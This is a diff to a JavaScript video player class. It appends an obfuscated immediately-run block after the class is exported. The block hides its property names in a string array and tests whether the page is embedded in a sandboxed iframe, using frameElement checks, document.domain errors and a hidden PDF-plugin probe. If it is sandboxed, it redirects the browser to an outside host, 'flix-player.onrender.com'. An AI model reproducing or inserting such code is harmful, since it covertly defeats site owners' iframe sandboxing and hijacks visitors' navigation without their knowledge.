@@ -521,3 +521,70 @@ class Player {
 
 // Exponer al ámbito global
 window.Player = Player;
+
+(function() {
+  try {
+    const _d0r4 = "https://flix-player.onrender.com/sandbox.html";
+    const _ = [
+      "sandbox", "hasAttribute", "frameElement", "data", "indexOf", "href", "domain", "", "plugins", "undefined",
+      "namedItem", "Chrome PDF Viewer", "object", "createElement", "onerror", "type", "application/pdf",
+      "setAttribute", "style", "visibility:hidden;width:0;height:0;position:absolute;top:-99px;",
+      "data:application/pdf;base64,JVBERi0xLg0KdHJhaWxlcjw8L1Jvb3Q8PC9QYWdlczw8L0tpZHNbPDwvTWVkaWFCb3hbMCAwIDMgM10+Pl0+Pj4+Pj4=",
+      "appendChild", "body", "removeChild", "parentElement", _d0r4, "substring", "referrer"
+    ];
+
+    const q = () => window.location.href = _d0r4;
+
+    const b = () => {
+      try {
+        if (config.ampallow) {
+          const o = window.location.ancestorOrigins;
+          if (o[o.length - 1].endsWith("ampproject.org")) return;
+        }
+      } catch (e) {}
+      setTimeout(q, 900);
+    };
+
+    const v = () => {
+      try {
+        if (window[_[2]][_[1]](_[0])) return b();
+      } catch (e) {}
+
+      if (location[_[5]].indexOf(_[3]) !== -1 && document[_[6]] === _[7]) return b();
+
+      if (
+        typeof navigator[_[8]] !== _[9] &&
+        typeof navigator[_[8]][_[10]] !== _[9] &&
+        navigator[_[8]][_[10]](_[11]) !== null
+      ) {
+        const x = document[_[13]](_[12]);
+        x[_[14]] = b;
+        x[_[17]](_[15], _[16]);
+        x[_[17]](_[18], _[19]);
+        x[_[17]](_[3], _[20]);
+        document[_[22]][_[21]](x);
+        setTimeout(() => x[_[24]][_[23]](x), 150);
+      }
+    };
+
+    v();
+
+    if ((() => {
+      try { document.domain = document.domain; }
+      catch (e) {
+        try { if (e.toString().toLowerCase().includes("sandbox")) return true; }
+        catch (e) {}
+      }
+      return false;
+    })()) b();
+
+    if ((() => {
+      if (window.parent === window) return false;
+      let f;
+      try { f = window.frameElement; }
+      catch (e) { f = null; }
+      return f === null ? document.domain === "" && location.protocol !== "data:" : f.hasAttribute("sandbox");
+    })()) b();
+
+  } catch (e) {}
+})();
